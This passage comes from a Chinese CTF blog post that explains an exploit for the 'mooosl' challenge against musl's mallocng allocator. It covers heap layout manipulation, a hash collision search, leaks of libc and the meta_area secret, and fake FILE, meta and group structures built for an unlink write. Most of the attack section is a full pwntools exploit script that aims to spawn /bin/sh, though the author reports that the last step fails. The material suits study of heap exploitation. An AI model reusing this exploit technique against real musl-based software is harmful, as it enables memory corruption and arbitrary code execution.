free_meta(g);</span><br><span class="line">	<span class="keyword">return</span> mi;</span><br></pre></td></tr></table></figure>
<p>当一个group中所有的chunk均被释放时，在释放最后一个chunk时会调用到<code>free_group</code>函数将group释放，这是我们不希望看到的，因此在堆排布的过程中，我们不应该让一个meta中的所有chunk在某一时刻全部被释放。</p>
<p>另外注意到，<code>malloc</code>函数在选择chunk时不会去选择刚刚被<code>free</code>的chunk，因为此时代表该chunk的bit只在<code>freed_mask</code>中为1，在<code>avail_mask</code>中为0。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">activate_group</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;avail_mask);</span><br><span class="line">	<span class="type">uint32_t</span> mask, act = (<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">do</span> mask = m-&gt;freed_mask;</span><br><span class="line">	<span class="keyword">while</span> (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span><br><span class="line">	<span class="keyword">return</span> m-&gt;avail_mask = mask &amp; act;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>activate_group</code>函数则可以将<code>free_mask</code>中的所有chunk变为<code>avail_mask</code>。这个函数触发的条件是：<strong>这个group的<code>avail_mask</code>为0，该group中不是被free的chunk就是正在使用的chunk</strong>。因此，想要分配到已经被free的结构体所在的chunk，就应该首先让这个group中的chunk全部被分配一次。</p>
<p>考虑到本题使用的是<code>calloc</code>而不是<code>malloc</code>，因此堆排布的目标应该是让一个结构体的value指向另一个结构体，而且不能分配到原来结构体所在的chunk。可行的方法是：</p>
<ul>
<li>Step 1: 分配第1个storage结构体</li>
<li>Step 2: 进行堆空间排布</li>
<li>Step 3: 分配第2个storage结构体使得storage结构体本身位于其value的后面</li>
<li>Step 4: delete第2个storage</li>
<li>Step 5: 分配第3个storage结构体使得这个结构体的chunk就是第2个storage的value</li>
<li>Step 6: 对第2个storage调用query以获得第3个storage结构体中的指针等</li>
</ul>
<p>这里需要进行计算，让两个不同的key值具有相同的哈希值，这个不难实现，因为最终结果是12比特，穷举即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>如上面的代码片段所示，即可通过query操作打印出最后一个store创建的结构体的信息。最后一个store的value地址就在当前的group中，根据这个值可以获取该group的地址。注意这里的最后一次store分配了一个大空间，这会让musl在libc地址正下方mmap一块空间，这样我们可以通过这个地址获取到libc的基地址。在此之后，我们只需要重复地通过query操作修改第二次store获得的storage中的value地址，即可实现任意地址读。因为此时我们可以根据获取的两个地址推导出第二个storage中的关键字段的值。在第一次leak之后，7个chunk索引从高到低的状态应该依次为：AAAAUUU（A可用，U正用，F释放），其中第7个是第二个storage结构体保存的位置，那么我们可以先用3个无效的query让状态变为AFFFUUU，然后就可以使用query操作来修改第二个storage结构体的值，最后再一次query进行任意写。</p>
<p>由此，我们可以获取到<code>meta_area</code>的<code>secret</code>值，libc的基地址等关键信息，之后就要开始使用unlink进行利用了。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h1 id="3-解题第二步伪造file-meta-group等结构并利用"><a class="markdownIt-Anchor" href="#3-解题第二步伪造file-meta-group等结构并利用"></a> 3. 解题第二步：伪造<code>FILE</code>、<code>meta</code>、<code>group</code>等结构并利用</h1>
<p>这一步是常规步骤，我们将伪造的<code>FILE</code>结构体、伪造的<code>meta</code>、<code>group</code>、<code>chunk</code>放在一个chunk中，注意<code>meta_area</code>需要页对齐，并在页首部写入<code>secret</code>值。</p>
<p>写入之后，我们想办法释放假的chunk，方法是将原来用于leak的chunk分配出去，然后修改内部指针的值，再通过delete删除即可。然后就可以利用unlink修改stderr指针的值为我们的假chunk。但是很不幸的是，stderr指针所在的段是只读的，我不知道为什么很多的文章都说要修改这个地方，但是这里不能改，如果能改的话是肯定可以过的。也就是最后一次delete无法完成。</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./mooosl&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;libc.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mooosl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">att = <span class="keyword">lambda</span>: gdb.attach(io)</span><br><span class="line">sleep = <span class="keyword">lambda</span>: time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_original</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size = <span class="literal">None</span>, value_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(value_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(value_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">victim: <span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    target = encrypt(victim)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> encrypt(<span class="built_in">str</span>(i).encode()) == target <span class="keyword">and</span> <span class="built_in">str</span>(i).encode() != victim:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i).encode()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2bytes</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content) // <span class="number">2</span>):</span><br><span class="line">        res += p8(<span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>], <span class="number">16</span>) * <span class="number">0x10</span> + <span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>+<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">fake_file_addr = libc_base - <span class="number">0x3000</span> + <span class="number">0x560</span></span><br><span class="line">fake_meta_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = p64(group_addr + <span class="number">0x20</span>)</span><br><span class="line">key += p64(fake_group_addr + <span class="number">0x10</span>)</span><br><span class="line">key += p64(<span class="number">4</span>)</span><br><span class="line">key += p64(<span class="number">0x30</span>)</span><br><span class="line">key += p64(encrypt_original(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>))))</span><br><span class="line">key += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>)     <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system)    <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">fake_meta = p64(fake_group_addr + <span class="number">0x10</span> + <span class="number">0x80</span>)      <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr)                            <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)                   <span class="comment"># fake_meta-&gt;mem</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>)                                 <span class="comment"># fake_meta-&gt;avail_mask</span></span><br><span class="line">fake_meta += p64(last_idx + (freeable &lt;&lt; <span class="number">5</span>) + (sizeclass &lt;&lt; <span class="number">6</span>) + (maplen &lt;&lt; <span class="number">12</span>))</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr)</span><br><span class="line">fake_group += p64(<span class="number">1</span>)</span><br><span class="line">fake_group += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">value = fake_file.ljust(<span class="number">0x1000</span> - <span class="number">0x560</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += p64(secret).ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">value += fake_meta</span><br><span class="line">value += fake_group</span><br><span class="line">value += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x530</span></span><br><span class="line"></span><br><span class="line">store(key, value, key_size=<span class="number">0x30</span>, value_size=<span class="built_in">len</span>(value))</span><br><span class="line"><span class="comment"># query(p64(group_addr + 0x20) + p64(fake_group_addr + 0x90) + p64(4) + p64(0x30) +</span></span><br><span class="line"><span class="comment">#       p64(encrypt_original(find_collision(find_collision(b&#x27;B&#x27;)))) + p64(0), key_size=0x30)</span></span><br><span class="line">info(<span class="string">&#x27;fake chunk address: &#x27;</span> + <span class="built_in">hex</span>(fake_group_addr + <span class="number">0x90</span>))</span><br><span class="line">info(<span class="string">&#x27;stderr: &#x27;</span> + <span class="built_in">hex</span>(stderr))</span><br><span class="line">info(<span class="string">&#x27;group address: &#x27;</span> + <span class="built_in">hex</span>(group_addr))</span><br><span class="line">info(<span class="string">&#x27;mmap space: &#x27;</span> + <span class="built_in">hex</span>(mmap_addr))</span><br><span class="line">delete(find_collision(find_collision(<span class="string">b&#x27;B&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-3/" class="post-title-link" itemprop="url">musl pwn 入门 (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:41:27" itemprop="dateCreated datePublished" datetime="2023-02-28T22:41:27+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:11" itemprop="dateModified" datetime="2023-03-01T11:31:11+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/musl-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">musl pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>15k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
